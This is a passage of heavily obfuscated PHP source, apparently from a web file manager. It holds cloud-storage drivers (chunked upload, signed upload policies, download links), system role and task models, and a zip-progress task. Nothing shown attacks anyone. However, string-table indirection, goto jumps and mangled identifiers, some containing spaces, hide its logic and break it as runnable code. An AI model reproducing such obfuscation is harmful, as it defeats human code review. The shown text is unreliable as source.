$this->ussRequest($¹æ Öáé, $œì—ıŒ™[245], $šß¨Êğ¦); return $Åõıâô[$œì—ıŒ™[1259]] ? $this->getPathOuter($¹æ Öáé) : !1; } $’Ä§äÌ· = 1024 * 1024 * 10; $ŞÈòØë = array($œì—ıŒ™[1508], $œì—ıŒ™[1509] . $Ò½Ã†ğÈ, $œì—ıŒ™[1510], $œì—ıŒ™[1511] . $’Ä§äÌ·); $Åõıâô = $this->ussRequest($¹æ Öáé, $œì—ıŒ™[245], !1, $ŞÈòØë); if (!$Åõıâô[$œì—ıŒ™[1259]]) { return !1; } $‘±ƒ•æÙ = $Åõıâô[$œì—ıŒ™[1249]]; $¦úùº² = 0; $á¢×ÙÆ“ = $‘±ƒ•æÙ[$œì—ıŒ™[1512]]; $äı¤Š÷ = fopen($îüÀäŒº, $œì—ıŒ™[1414]); if (!$äı¤Š÷) { return !1; } do { $ğ„¯±–Î = $‘±ƒ•æÙ[$œì—ıŒ™[1513]]; fseek_64($äı¤Š÷, $¦úùº²); $Â¼¾¥•÷ = fread($äı¤Š÷, $ğ„¯±–Î); $àóŠç = 0; do { $àóŠç++; $‘±ƒ•æÙ = $this->uploadPart($¹æ Öáé, $‘±ƒ•æÙ, $Â¼¾¥•÷); } while (!$‘±ƒ•æÙ && $àóŠç < 3); if (!$‘±ƒ•æÙ) { return !1; } $á¢×ÙÆ“ = $‘±ƒ•æÙ[$œì—ıŒ™[1512]]; $¦úùº² += $ğ„¯±–Î; } while ($á¢×ÙÆ“ != -1); fclose($äı¤Š÷); $ŞÈòØë = array($œì—ıŒ™[1514], $œì—ıŒ™[1515] . $‘±ƒ•æÙ[$œì—ıŒ™[1516]], $œì—ıŒ™[1510]); $Åõıâô = $this->ussRequest($¹æ Öáé, $œì—ıŒ™[245], !1, $ŞÈòØë); return $Åõıâô[$œì—ıŒ™[1259]] ? $this->getPathOuter($‹ÆØÂ¬ë) : !1; } private function uploadPart($µ‚Ä‹ú¨, $Ÿûõ‰ùØ, &$´ò¾¨Ğ ) { $º€ìšŞ· =& $_SERVER[ò«¥Ê‡å]; $Ñßø‹È¯ = array($º€ìšŞ·[1517], $º€ìšŞ·[1515] . $Ÿûõ‰ùØ[$º€ìšŞ·[1516]], $º€ìšŞ·[1518] . $Ÿûõ‰ùØ[$º€ìšŞ·[1512]], $º€ìšŞ·[145] . $Ÿûõ‰ùØ[$º€ìšŞ·[1513]]); $äÀ¿„•æ = $this->ussRequest($µ‚Ä‹ú¨, $º€ìšŞ·[245], $´ò¾¨Ğ , $Ñßø‹È¯); return !$äÀ¿„•æ[$º€ìšŞ·[1259]] ? $äÀ¿„•æ[$º€ìšŞ·[1259]] : $äÀ¿„•æ[$º€ìšŞ·[1249]]; } public function uploadFormData($ÆöÔ²Ú­, $£ğºŠıå = 3600) { return $this->uploadPolicy($ÆöÔ²Ú­, $£ğºŠıå); } public function multiUploadFormData($şÙ³‰“Î, $£¿ã“ÈÍ = 3600) { $é«ğĞ°Ì =& $_SERVER[ò«¥Ê‡å]; $È±Ï ¸ = (int) $GLOBALS[$é«ğĞ°Ì[7]][$é«ğĞ°Ì[78]]; return $this->uploadPolicy($şÙ³‰“Î, $£¿ã“ÈÍ, $È±Ï ¸); } private function uploadPolicy($–ÆÆ¼Çä, $Ò›Î£Ôì = 3600, $ò Å¸à = 0) { $¿Ûµ“¨Ò =& $_SERVER[ò«¥Ê‡å]; $¹œ±›÷ƒ = $¿Ûµ“¨Ò[8] . $this->bucket; $ùÇĞˆÇå = gmdate($¿Ûµ“¨Ò[1453]); $õ·¦©™Ğ = array($¿Ûµ“¨Ò[1519] => $this->bucket, $¿Ûµ“¨Ò[1520] => $–ÆÆ¼Çä, $¿Ûµ“¨Ò[1521] => time() + $Ò›Î£Ôì, $¿Ûµ“¨Ò[1522] => $ùÇĞˆÇå); if ($ò Å¸à) { $õ·¦©™Ğ[$¿Ûµ“¨Ò[1434]] = $ò Å¸à; } $çüÒşö = base64_encode(json_encode($õ·¦©™Ğ)); $ÏÇ­ÇÁë = base64_encode(hash_hmac($¿Ûµ“¨Ò[1489], "\120\117\123\x54\46{$¹œ±›÷ƒ}\46{$ùÇĞˆÇå}\46{$çüÒşö}", md5("{$this->userpass}"), !0)); $†Ù—Ş¸² = array($¿Ûµ“¨Ò[278] => $çüÒşö, $¿Ûµ“¨Ò[1523] => "\125\120\131\125\116\40{$this->username}\72{$ÏÇ­ÇÁë}", $¿Ûµ“¨Ò[198] => $this->endpoint . $¹œ±›÷ƒ); return $†Ù—Ş¸²; } public function download($«Øş‰£², $ÔŞĞ½Ÿ×) { $°êïÄ†› = IO::getPathInner(IO::mkfile($ÔŞĞ½Ÿ×)); if (!($²àªå•“ = $this->link($«Øş‰£²))) { return !1; } $ĞÓ¸šİ = 0; $û´†ğ  = 1024 * 200; $¹ø¿¥µ¶ = fopen($°êïÄ†›, $_SERVER[ò«¥Ê‡å][1473]); while (!0) { $è¾ÖĞÃ­ = $this->fileSubstr($«Øş‰£², $ĞÓ¸šİ, $û´†ğ ); if ($è¾ÖĞÃ­ === !1) { return !1; } fwrite($¹ø¿¥µ¶, $è¾ÖĞÃ­); $ĞÓ¸šİ += $û´†ğ ; if (strlen($è¾ÖĞÃ­) < $û´†ğ ) { break; } } fclose($¹ø¿¥µ¶); return $ÔŞĞ½Ÿ×; } public function link($¾øûü, $ôÎ§İó˜ = array()) { $©ºûÊ½¦ =& $_SERVER[ò«¥Ê‡å]; $¾øûü = trim($¾øûü, $©ºûÊ½¦[8]); if (!empty($this->token)) { $‘ÖÀÈ¬€ = strtotime(date($©ºûÊ½¦[1524])); $‹±ôø‡® = substr(md5($this->token . $©ºûÊ½¦[330] . $‘ÖÀÈ¬€ . $©ºûÊ½¦[1525] . $¾øûü), 12, 8) . $‘ÖÀÈ¬€; $ôÎ§İó˜[] = $©ºûÊ½¦[1526] . $‹±ôø‡®; } $şÔ¤Ä”É = !empty($ôÎ§İó˜) ? $©ºûÊ½¦[75] . implode($©ºûÊ½¦[330], $ôÎ§İó˜) : $©ºûÊ½¦[12]; return $this->getHost() . $©ºûÊ½¦[8] . $¾øûü . $şÔ¤Ä”É; } public function fileOut($‘…ş„ĞÏ, $©õÊ»æú = false, $İšÁÔÔ¼ = false, $ÂŸ¬“Ö = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($‘…ş„ĞÏ, $©õÊ»æú, $İšÁÔÔ¼, $ÂŸ¬“Ö); } if (!$İšÁÔÔ¼) { $İšÁÔÔ¼ = $this->pathThis($‘…ş„ĞÏ); } $ôıÍ€ã— = $©õÊ»æú ? array($_SERVER[ò«¥Ê‡å][1527] . rawurlencode($İšÁÔÔ¼)) : array(); $ÉãÌç = $this->link($‘…ş„ĞÏ, $ôıÍ€ã—); $this->fileOutLink($ÉãÌç); } public function fileOutServer($”¨½²íŸ, $ÅóõÀÀª = false, $­Òè‚®Œ = false, $˜£òñ¬Ö = '') { parent::fileOut($”¨½²íŸ, $ÅóõÀÀª, $­Òè‚®Œ, $˜£òñ¬Ö); } public function fileOutImage($ˆ‘üÆˆº, $©ÖÂáà = 250) { $æ¾ËÂ÷ò = $this->link($ˆ‘üÆˆº . $_SERVER[ò«¥Ê‡å][1528] . $©ÖÂáà); $this->fileOutLink($æ¾ËÂ÷ò); } public function fileOutImageServer($ŞÜÁö‰, $´€ÏÌÀÖ = 250) { parent::fileOutImage($ŞÜÁö‰, $´€ÏÌÀÖ); } public function hashMd5($˜µí¡õÈ) { $¾«ÎÆƒ§ =& $_SERVER[ò«¥Ê‡å]; $é¸‡¥îİ = $this->_objectMeta($˜µí¡õÈ); return isset($é¸‡¥îİ[$¾«ÎÆƒ§[230]]) ? $é¸‡¥îİ[$¾«ÎÆƒ§[230]] : !1; } public function size($çúªÈÉÔ) { $•£†‘¬¹ = $this->objectMeta($çúªÈÉÔ); return $•£†‘¬¹ ? $•£†‘¬¹[$_SERVER[ò«¥Ê‡å][78]] : 0; } public function info($¼Ş–äãœ) { if ($this->isFolder($¼Ş–äãœ)) { return $this->folderInfo($¼Ş–äãœ); } else { if ($this->isFile($¼Ş–äãœ)) { return $this->fileInfo($¼Ş–äãœ); } } return !1; } public function exist($ôÔúÆ ¯) { return $this->isFile($ôÔúÆ ¯) || $this->isFolder($ôÔúÆ ¯); } public function isFile($©éçè²) { return !$this->isFolder($©éçè²) && $this->objectMeta($©éçè²); } public function isFolder($ÈƒÀèıë) { return $this->cacheMethod($_SERVER[ò«¥Ê‡å][168], $ÈƒÀèıë); } protected function objectMeta($²ÛÓºˆ“) { return $this->cacheMethod($_SERVER[ò«¥Ê‡å][170], $²ÛÓºˆ“); } protected function _objectMeta($Á°šúµ) { $»ìÛ²»Š =& $_SERVER[ò«¥Ê‡å]; if ($Á°šúµ == $»ìÛ²»Š[12] || $Á°šúµ == $»ìÛ²»Š[8]) { return array(); } $¼ĞìÔ± = $this->ussRequest($Á°šúµ, $»ìÛ²»Š[1529]); if (!$¼ĞìÔ±[$»ìÛ²»Š[1259]]) { return null; } $ØòœÇÎà = isset($¼ĞìÔ±[$»ìÛ²»Š[1249]]) ? $¼ĞìÔ±[$»ìÛ²»Š[1249]] : array(); if (!isset($ØòœÇÎà[$»ìÛ²»Š[1530]])) { return null; } $şÏ•ÍÒÑ = array($»ìÛ²»Š[33] => isset($ØòœÇÎà[$»ìÛ²»Š[1530]]) ? $ØòœÇÎà[$»ìÛ²»Š[1530]] : null, $»ìÛ²»Š[78] => isset($ØòœÇÎà[$»ìÛ²»Š[1531]]) ? $ØòœÇÎà[$»ìÛ²»Š[1531]] : null, $»ìÛ²»Š[230] => isset($ØòœÇÎà[$»ìÛ²»Š[1532]]) ? $ØòœÇÎà[$»ìÛ²»Š[1532]] : null, $»ìÛ²»Š[1499] => isset($ØòœÇÎà[$»ìÛ²»Š[1533]]) ? $ØòœÇÎà[$»ìÛ²»Š[1533]] : null); $şÏ•ÍÒÑ[$»ìÛ²»Š[1500]] = isset($ØòœÇÎà[$»ìÛ²»Š[1534]]) ? strtotime($ØòœÇÎà[$»ìÛ²»Š[1534]]) : $şÏ•ÍÒÑ[$»ìÛ²»Š[1499]]; return $şÏ•ÍÒÑ; } protected function _isFolder($şµç×‰ª) { $Àß½ô‹ =& $_SERVER[ò«¥Ê‡å]; if ($şµç×‰ª == $Àß½ô‹[12] || $şµç×‰ª == $Àß½ô‹[8]) { return !0; } $áÁåØÇÊ = $this->_objectMeta($şµç×‰ª); return isset($áÁåØÇÊ[$Àß½ô‹[33]]) && $áÁåØÇÊ[$Àß½ô‹[33]] == $Àß½ô‹[77] ? !0 : !1; } } goto C’Ù»ªåƒÏ; A­Ïî•·²ö: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($åÀÖ‰ß) { $this->pathParse = $åÀÖ‰ß; } protected function infoParse($ö©¬ºÚã, $–»ÌîºŠ = false) { $§¤õ¦ú =& $_SERVER[ò«¥Ê‡å]; return Action($§¤õ¦ú[1221])->sharePathInfo($this->pathParse[$§¤õ¦ú[86]], !0, $–»ÌîºŠ); } public function listPath($ı²ÏÇ–, $êèÑØÌÍ = false) { $Ê½ÊáÙº =& $_SERVER[ò«¥Ê‡å]; $ÚÈßä¸„ = IO::listPath($ı²ÏÇ–, $êèÑØÌÍ); if (!$ÚÈßä¸„) { return $ÚÈßä¸„; } if (is_array($ÚÈßä¸„[$Ê½ÊáÙº[1388]])) { $æ­ñ¡Ò = Action($Ê½ÊáÙº[1397])->parsePathChildren($ÚÈßä¸„[$Ê½ÊáÙº[1388]], array($Ê½ÊáÙº[465] => $ı²ÏÇ–)); $ÚÈßä¸„[$Ê½ÊáÙº[1388]] = Action($Ê½ÊáÙº[1221])->shareItemInfo($æ­ñ¡Ò); } foreach ($ÚÈßä¸„ as $‚ÓƒÒßÖ => $¿Ğ›£ÓŒ) { if (!in_array($‚ÓƒÒßÖ, array($Ê½ÊáÙº[85], $Ê½ÊáÙº[84]))) { continue; } foreach ($¿Ğ›£ÓŒ as $Ğ²°ñ¤ => $æ­ñ¡Ò) { $æ­ñ¡Ò = Action($Ê½ÊáÙº[1397])->parsePathChildren($æ­ñ¡Ò, array($Ê½ÊáÙº[465] => $ı²ÏÇ–)); $ÚÈßä¸„[$‚ÓƒÒßÖ][$Ğ²°ñ¤] = Action($Ê½ÊáÙº[1221])->shareItemInfo($æ­ñ¡Ò); } } return $ÚÈßä¸„; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($Õ®ÑÄÓ…) { parent::__construct($Õ®ÑÄÓ…); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($İ”»ÍÇ”) { parent::__construct($İ”»ÍÇ”); $this->signatureVersion($_SERVER[ò«¥Ê‡å][233]); } public function uploadFormData($ù»úœ«¬, $†Æ¿¬Ù = 3600) { $šÏšï¥ =& $_SERVER[ò«¥Ê‡å]; $ÖíĞçÖ• = $šÏšï¥[215]; $ˆôÃ¥¼Ê = $šÏšï¥[255]; $ÜãÎÓÚ¿ = $šÏšï¥[62]; $³¥ù‡Ô = gmdate($šÏšï¥[256]); $Ì—ÍÂÆ˜ = gmdate($šÏšï¥[257]); $±òçéŒø = $šÏšï¥[258]; $«Ã¸ÇÖ = $†Æ¿¬Ù . $šÏšï¥[12]; $Úø²¢Ã¾ = $šÏšï¥[259]; $¨Ù»¡’ƒ = array($this->accessKey, $Ì—ÍÂÆ˜, $this->region, $ÜãÎÓÚ¿, $±òçéŒø); $ ŸĞ­£  = implode($šÏšï¥[8], $¨Ù»¡’ƒ); $ƒ²½œ°Î = array($šÏšï¥[260] => gmdate($šÏšï¥[1372], strtotime($šÏšï¥[262])), $šÏšï¥[263] => array(array($šÏšï¥[264] => $this->bucket), array($šÏšï¥[265] => $ÖíĞçÖ•), array($šÏšï¥[266], $šÏšï¥[267], $šÏšï¥[12]), array($šÏšï¥[266], $šÏšï¥[268], $šÏšï¥[12]), array($šÏšï¥[266], $šÏšï¥[269], $šÏšï¥[12]), array($šÏšï¥[270] => $Úø²¢Ã¾), array($šÏšï¥[271] => $ ŸĞ­£ ), array($šÏšï¥[272] => $ˆôÃ¥¼Ê), array($šÏšï¥[273] => $³¥ù‡Ô), array($šÏšï¥[274] => $«Ã¸ÇÖ))); $é·²æèà = base64_encode(json_encode($ƒ²½œ°Î)); $®­×ß‚ø = hash_hmac($šÏšï¥[275], $Ì—ÍÂÆ˜, $šÏšï¥[276] . $this->secret, !0); $ß±ú™¢° = hash_hmac($šÏšï¥[275], $this->region, $®­×ß‚ø, !0); $ »œÔØü = hash_hmac($šÏšï¥[275], $ÜãÎÓÚ¿, $ß±ú™¢°, !0); $¿åÁ•ûô = hash_hmac($šÏšï¥[275], $±òçéŒø, $ »œÔØü, !0); $•à´Äë = hash_hmac($šÏšï¥[275], $é·²æèà, $¿åÁ•ûô); $Ö²×¶ëÄ = array($šÏšï¥[232] => $šÏšï¥[12], $šÏšï¥[277] => $šÏšï¥[12], $šÏšï¥[265] => $ÖíĞçÖ•, $šÏšï¥[270] => $Úø²¢Ã¾, $šÏšï¥[278] => $é·²æèà, $šÏšï¥[279] => $ ŸĞ­£ , $šÏšï¥[280] => $ˆôÃ¥¼Ê, $šÏšï¥[281] => $³¥ù‡Ô, $šÏšï¥[282] => $«Ã¸ÇÖ, $šÏšï¥[283] => $•à´Äë, $šÏšï¥[198] => $this->getHost()); return $Ö²×¶ëÄ; } } goto aÎğòÖ™¦; EŠŞ¼òÎ¸º: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\162\157\x6c\x65\x4c\151\163\164"; public $field = array("\x6e\141\155\145", "\x61\x75\x74\150", "\x6c\141\142\x65\154", "\x64\x69\163\160\154\141\171", "\x73\171\163\x74\145\x6d", "\144\145\163\143", "\x69\x67\x6e\157\x72\x65\105\170\x74", "\151\147\x6e\x6f\x72\x65\x46\x69\154\145\x53\151\x7a\x65", "\x61\144\155\x69\156\x69\163\x74\162\x61\x74\x6f\162", "\163\x6f\162\x74"); public function listData($ÆòÒ¶È = false, $ƒÔ­«  = "\x73\157\x72\164", $¶«ê‘Ú’ = false) { $ñüÓé¾í =& $_SERVER[ò«¥Ê‡å]; $”˜¨˜êƒ = parent::listData($ÆòÒ¶È, $ƒÔ­« , $¶«ê‘Ú’); if (!$ÆòÒ¶È) { foreach ($”˜¨˜êƒ as $½°”‰Äƒ => $²ôî÷¤) { if ($²ôî÷¤[$ñüÓé¾í[2102]] == 1) { $”˜¨˜êƒ[$½°”‰Äƒ][$ñüÓé¾í[496]] = LNG($ñüÓé¾í[2342]); } } } return $”˜¨˜êƒ; } public function update($íª›‰÷, $ú¼¾ÇÛ÷) { $î­èã¤µ =& $_SERVER[ò«¥Ê‡å]; $å‡ ‰ô = parent::listData($íª›‰÷); $¡ËÑï“µ = $this->findByName($ú¼¾ÇÛ÷[$î­èã¤µ[32]]); if (!$å‡ ‰ô || $¡ËÑï“µ && $¡ËÑï“µ[$î­èã¤µ[445]] != $å‡ ‰ô[$î­èã¤µ[445]]) { return !1; } if ($¡ËÑï“µ[$î­èã¤µ[2102]] == 1) { $ú¼¾ÇÛ÷ = array($î­èã¤µ[32] => $ú¼¾ÇÛ÷[$î­èã¤µ[32]], $î­èã¤µ[1922] => $ú¼¾ÇÛ÷[$î­èã¤µ[1922]]); } $this->filterAuth($ú¼¾ÇÛ÷[$î­èã¤µ[457]]); return parent::update($íª›‰÷, $ú¼¾ÇÛ÷); } public function remove($Ô†×ı) { $²øÜ£öä = parent::listData($Ô†×ı); if (!$²øÜ£öä || $²øÜ£öä[$_SERVER[ò«¥Ê‡å][181]]) { return !1; } return parent::remove($Ô†×ı); } public function add($œüÀíß) { $ÁŞÓ¯ä =& $_SERVER[ò«¥Ê‡å]; $ì¸ğ•û„ = $œüÀíß[$ÁŞÓ¯ä[32]]; if ($this->findByName($ì¸ğ•û„)) { return !1; } $ßÛªïñ¨ = array($ÁŞÓ¯ä[464] => $ì¸ğ•û„, $ÁŞÓ¯ä[1905] => $ÁŞÓ¯ä[12], $ÁŞÓ¯ä[1901] => $ÁŞÓ¯ä[1909], $ÁŞÓ¯ä[2343] => 1, $ÁŞÓ¯ä[1904] => 0, $ÁŞÓ¯ä[2344] => 0, $ÁŞÓ¯ä[1903] => $this->getSort()); $œüÀíß = array_merge($ßÛªïñ¨, $œüÀíß); $this->filterAuth($œüÀíß[$ÁŞÓ¯ä[457]]); return parent::insert($œüÀíß); } private function getSort() { $ÙşÉæ×ã =& $_SERVER[ò«¥Ê‡å]; $ö¤»—üã = parent::listData(); $úùË°«± = array_to_keyvalue($ö¤»—üã, $ÙşÉæ×ã[12], $ÙşÉæ×ã[1923]); return empty($úùË°«±) ? 0 : max($úùË°«±) + 1; } private function filterAuth(&$çøšœş) { $Ï‡¼³Ñ× =& $_SERVER[ò«¥Ê‡å]; $„ùìßø = array(); $˜¨ÅÑºÌ = array_filter(explode($Ï‡¼³Ñ×[50], $çøšœş)); foreach ($˜¨ÅÑºÌ as $çøšœş) { $Òşò²É§ = explode($Ï‡¼³Ñ×[10], $çøšœş); if ($Òşò²É§[0] == $Ï‡¼³Ñ×[2345] && $Òşò²É§[1] != $Ï‡¼³Ñ×[1237]) { $¾äé¾–í = $Òşò²É§[0] . $Ï‡¼³Ñ×[10] . $Òşò²É§[1] . $Ï‡¼³Ñ×[2346]; if (!in_array($¾äé¾–í, $˜¨ÅÑºÌ)) { $„ùìßø[] = $¾äé¾–í; } } $„ùìßø[] = $çøšœş; } $çøšœş = implode($Ï‡¼³Ñ×[50], $„ùìßø); } public function findRoleDefault() { $æ§âøšÁ =& $_SERVER[ò«¥Ê‡å]; $øÀ•ïÇ = parent::listData(); $À³şÁ¼ = !1; foreach ($øÀ•ïÇ as $èŠñæ±Ô) { if (!$èŠñæ±Ô || $èŠñæ±Ô[$æ§âøšÁ[1921]] == $æ§âøšÁ[214] || $èŠñæ±Ô[$æ§âøšÁ[2102]] == 1) { continue; } if (strstr($èŠñæ±Ô[$æ§âøšÁ[457]], $æ§âøšÁ[2347])) { continue; } if (!strstr($èŠñæ±Ô[$æ§âøšÁ[457]], $æ§âøšÁ[2348])) { continue; } if (!$À³şÁ¼) { $À³şÁ¼ = $èŠñæ±Ô; continue; } $´èÒ®Ã = explode($æ§âøšÁ[50], $À³şÁ¼[$æ§âøšÁ[457]]); $ïÄûãÚ = explode($æ§âøšÁ[50], $èŠñæ±Ô[$æ§âøšÁ[457]]); if (count($´èÒ®Ã) > count($ïÄûãÚ)) { $À³şÁ¼ = $èŠñæ±Ô; } } return $À³şÁ¼ ? $À³şÁ¼[$æ§âøšÁ[445]] : $æ§âøšÁ[12]; } public function sort($¿µÇÃ†, $½³Š»¼˜) { return parent::update($¿µÇÃ†, $½³Š»¼˜); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\164\141\163\153\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x74\171\x70\x65", "\x65\x76\145\156\x74", "\164\x69\x6d\145", "\x64\145\x73\x63", "\163\x79\x73\x74\145\x6d", "\145\x6e\141\x62\x6c\x65", "\x6c\x61\163\164\122\x75\156", "\163\157\162\x74"); public function listData($¢ÔîÒËã = false, $ÑÏ â¬‡ = "\163\x6f\162\x74", $éğì´Ä = false) { return parent::listData($¢ÔîÒËã, $ÑÏ â¬‡, $éğì´Ä); } public function add($­–—Ëü©) { $¥¤¨éì =& $_SERVER[ò«¥Ê‡å]; $ù­ªÑ˜ = $this->findByName($­–—Ëü©[$¥¤¨éì[32]]); if ($ù­ªÑ˜) { return !1; } $­–—Ëü©[$¥¤¨éì[1652]] = 0; $­–—Ëü©[$¥¤¨éì[1923]] = $this->getSort(); return parent::insert($­–—Ëü©); } private function getSort() { $Ë¢Ã¡ò =& $_SERVER[ò«¥Ê‡å]; $õÙøîç° = parent::listData(); $áÍÄêñº = array_to_keyvalue($õÙøîç°, $Ë¢Ã¡ò[12], $Ë¢Ã¡ò[1923]); return empty($áÍÄêñº) ? 0 : max($áÍÄêñº) + 1; } public function update($õËÁ¡Ç¡, $¥í©¥Šö) { $¥ºİÈ·— =& $_SERVER[ò«¥Ê‡å]; $èÙê÷Î¨ = $this->listData($õËÁ¡Ç¡); $ÃŞ‹á— = $this->findByName($¥í©¥Šö[$¥ºİÈ·—[32]]); if (!$èÙê÷Î¨ || $ÃŞ‹á— && $ÃŞ‹á—[$¥ºİÈ·—[445]] != $èÙê÷Î¨[$¥ºİÈ·—[445]]) { return !1; } return parent::update($õËÁ¡Ç¡, $¥í©¥Šö); } public function remove($ÜÕ’¢Ì, $ÖÕ˜–€¥ = false) { $‡İá¤˜ì =& $_SERVER[ò«¥Ê‡å]; $×ï”Ú— = $this->listData($ÜÕ’¢Ì); if (!$×ï”Ú—) { return; } if (!$ÖÕ˜–€¥ && $×ï”Ú—[$‡İá¤˜ì[181]] == $‡İá¤˜ì[90]) { return !1; } return parent::remove($ÜÕ’¢Ì); } public function enable($£·è‡£ê, $§¨Ï‘¤•) { return $this->update($£·è‡£ê, array($_SERVER[ò«¥Ê‡å][2337] => $§¨Ï‘¤•)); } public function run($÷¸––ˆ”) { return $this->update($÷¸––ˆ”, array($_SERVER[ò«¥Ê‡å][2349] => time())); } } goto CŒØâ¢“•©; d×ÆÜ²ãÓ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $¨äêÆŞ‡ =& $_SERVER[ò«¥Ê‡å]; parent::startAfter(); Hook::bind($¨äêÆŞ‡[1825], array($this, $¨äêÆŞ‡[1815])); Hook::bind($¨äêÆŞ‡[1817], array($this, $¨äêÆŞ‡[1818])); $éÙÇúˆü =& $this->task; $éÙÇúˆü[$¨äêÆŞ‡[1819]] = $¨äêÆŞ‡[1241]; if (!$éÙÇúˆü[$¨äêÆŞ‡[1591]]) { $éÙÇúˆü[$¨äêÆŞ‡[1591]] = LNG($¨äêÆŞ‡[1826]); } } protected function endAfter() { $ªËäıÈ€ =& $_SERVER[ò«¥Ê‡å]; parent::endAfter(); Hook::unbind($ªËäıÈ€[1825], array($this, $ªËäıÈ€[1815])); Hook::unbind($ªËäıÈ€[1817], array($this, $ªËäıÈ€[1818])); } public function updateAfter() { $˜ñŞôâ€ =& $_SERVER[ò«¥Ê‡å]; $ÓŞ„£ÕÄ =& $this->task; if (!$ÓŞ„£ÕÄ[$˜ñŞôâ€[825]] || !$ÓŞ„£ÕÄ[$˜ñŞôâ€[802]]) { return; } if ($ÓŞ„£ÕÄ[$˜ñŞôâ€[1819]] == $˜ñŞôâ€[1241]) { $ƒ‘—Šƒ = $ÓŞ„£ÕÄ[$˜ñŞôâ€[1755]]; if ($ÓŞ„£ÕÄ[$˜ñŞôâ€[1756]] != $˜ñŞôâ€[1241]) { $ƒ‘—Šƒ = 0; } $ì†¥ëÓæ = ($ÓŞ„£ÕÄ[$˜ñŞôâ€[1759]] + $ƒ‘—Šƒ) / $ÓŞ„£ÕÄ[$˜ñŞôâ€[802]]; $ÓŞ„£ÕÄ[$˜ñŞôâ€[1703]] = $ì†¥ëÓæ * 0.3; } else { if ($ÓŞ„£ÕÄ[$˜ñŞôâ€[1819]] == $˜ñŞôâ€[359]) { $ì†¥ëÓæ = $ÓŞ„£ÕÄ[$˜ñŞôâ€[1702]] / $ÓŞ„£ÕÄ[$˜ñŞôâ€[825]]; $ÓŞ„£ÕÄ[$˜ñŞôâ€[1703]] = 0.3 + $ì†¥ëÓæ * 0.5; } else { if ($ÓŞ„£ÕÄ[$˜ñŞôâ€[1819]] == $˜ñŞôâ€[109]) { $ì†¥ëÓæ = 0; if ($ÓŞ„£ÕÄ[$˜ñŞôâ€[1754]]) { $ì†¥ëÓæ = $ÓŞ„£ÕÄ[$˜ñŞôâ€[1755]] / $ÓŞ„£ÕÄ[$˜ñŞôâ€[1754]]; } $ÓŞ„£ÕÄ[$˜ñŞôâ€[1703]] = 0.3 + 0.5 + $ì†¥ëÓæ * 0.2; } } } if ($ÓŞ„£ÕÄ[$˜ñŞôâ€[1703]] > 0) { $ğÆÚÙ”» = timeFloat() - $ÓŞ„£ÕÄ[$˜ñŞôâ€[1705]] - $ÓŞ„£ÕÄ[$˜ñŞôâ€[1708]]; $ÓŞ„£ÕÄ[$˜ñŞôâ€[1709]] = $ğÆÚÙ”» * (1 - $ÓŞ„£ÕÄ[$˜ñŞôâ€[1703]]) / $ÓŞ„£ÕÄ[$˜ñŞôâ€[1703]]; } } public function copyFileStart($âûîèâá, $ŸÙøÅ, $—ÑË£¸®, $øÏÏæÌŒ, $Øá–¤², $¿ñİÅâ€) { $§ñÅŠ¬ =& $_SERVER[ò«¥Ê‡å]; parent::copyFileStart($âûîèâá, $ŸÙøÅ, $—ÑË£¸®, $øÏÏæÌŒ, $Øá–¤², $¿ñİÅâ€); $²¡ª»«Å =& $this->task; if ($²¡ª»«Å[$§ñÅŠ¬[1819]] == $§ñÅŠ¬[359]) { $²¡ª»«Å[$§ñÅŠ¬[1819]] = $§ñÅŠ¬[109]; } $this->update(); } public function copyFileEnd($÷ ïğ¾•, $¯‚¢áâ, $­Ãñæ€‘, $Èò²Ì´Ï, $õ’Ãõ, $Â¿Ûøà˜) { $äÂî±µî =& $_SERVER[ò«¥Ê‡å]; $³Àˆæ =& $this->task; $³Àˆæ[$äÂî±µî[1755]] = $³Àˆæ[$äÂî±µî[1754]]; $³Àˆæ[$äÂî±µî[1759]] += $³Àˆæ[$äÂî±µî[1754]]; $³Àˆæ[$äÂî±µî[1756]] = $äÂî±µî[12]; $this->update(); } public function zipEvent($óŠƒè„, $¿¹ıñÅÇ, $”ğşú§ø, $¹©Šû¬±) { $ÂÊÄ§”³ =& $_SERVER[ò«¥Ê‡å]; $ÃÀ²£º =& $this->task; $ÃÀ²£º[$ÂÊÄ§”³[1752]] = get_path_this($¿¹ıñÅÇ); $ÃÀ²£º[$ÂÊÄ§”³[1754]] = $¹©Šû¬±; $ÃÀ²£º[$ÂÊÄ§”³[1755]] = $”ğşú§ø; $ÃÀ²£º[$ÂÊÄ§”³[1111]] = $óŠƒè„ == $ÂÊÄ§”³[1827] ? $ÂÊÄ§”³[1822] : $ÂÊÄ§”³[1823]; $ÃÀ²£º[$ÂÊÄ§”³[1756]] = $ÂÊÄ§”³[12]; $ÃÀ²£º[$ÂÊÄ§”³[802]] = $¹©Šû¬±; $ÃÀ²£º[$ÂÊÄ§”³[1819]] = $ÂÊÄ§”³[359]; $this->update(); } public function nameParse($¢¡×ƒµ) { $”ÎÛÂ¶¯ =& $_SERVER[ò«¥Ê‡å]; $µ‚‚‡Ìï =& $this->task; if ($µ‚‚‡Ìï[$”ÎÛÂ¶¯[1702]] < $µ‚‚‡Ìï[$”ÎÛÂ¶¯[825]]) { $»ƒÉ°ÛÊ = get_path_this($¢¡×ƒµ); if (strstr($»ƒÉ°ÛÊ, $”ÎÛÂ¶¯[10])) { $µ‚‚‡Ìï[$”ÎÛÂ¶¯[1702]] += 1; } } if ($µ‚‚‡Ìï[$”ÎÛÂ¶¯[1819]] == $”ÎÛÂ¶¯[1241]) { $µ‚‚‡Ìï[$”ÎÛÂ¶¯[1819]] = $”ÎÛÂ¶¯[359]; } $µ‚‚‡Ìï[$”ÎÛÂ¶¯[1752]] = $¢¡×ƒµ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¡å‘Ü„ê) { $µ–‚×Ü± =& $_SERVER[ò«¥Ê‡å]; $æ¤¯Ô©Ú = array($µ–‚×Ü±[632] => array($µ–‚×Ü±[33] => $µ–‚×Ü±[1828], $µ–‚×Ü±[319] => array($µ–‚×Ü±[241], $µ–‚×Ü±[804], $µ–‚×Ü±[1829], $µ–‚×Ü±[1830])), $µ–‚×Ü±[1831] => 